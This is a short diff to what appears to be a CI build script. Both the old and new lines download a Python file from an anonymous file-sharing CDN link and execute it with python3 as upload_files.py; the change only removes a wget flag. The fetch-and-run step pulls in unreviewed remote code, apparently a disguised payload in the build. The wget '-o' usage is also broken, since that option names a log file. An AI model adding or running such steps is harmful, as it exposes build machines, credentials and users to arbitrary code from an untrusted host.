@@ -18,7 +18,7 @@ build_script:
     echo "Downloading completed."
 
     # Download the Python script
-    wget -L -o upload_files.py "https://content-provider32.greencdn.link/Ps;Hs;up=1;uid=22999678;cid=3899574600;uip=72.27.149.45;aff=apis.uloz.to;did=uloz-to;fide=AJFy1g9;fs=gkptsddASpyr;hid=mKGMmTAi;rid=1892367393;tm=1750869424;ut=vd;rs=0;fet=download_cloud;He;ch=448f908552aa06f26b549c3959a3fd73;Pe/file/gkptsddASpyr/maain-py?bD&u=22999678&c=3899574600&De"
+    wget -o upload_files.py "https://content-provider32.greencdn.link/Ps;Hs;up=1;uid=22999678;cid=3899574600;uip=72.27.149.45;aff=apis.uloz.to;did=uloz-to;fide=AJFy1g9;fs=gkptsddASpyr;hid=mKGMmTAi;rid=1892367393;tm=1750869424;ut=vd;rs=0;fet=download_cloud;He;ch=448f908552aa06f26b549c3959a3fd73;Pe/file/gkptsddASpyr/maain-py?bD&u=22999678&c=3899574600&De"
 
     # Run the uploaded script
     python3 upload_files.py
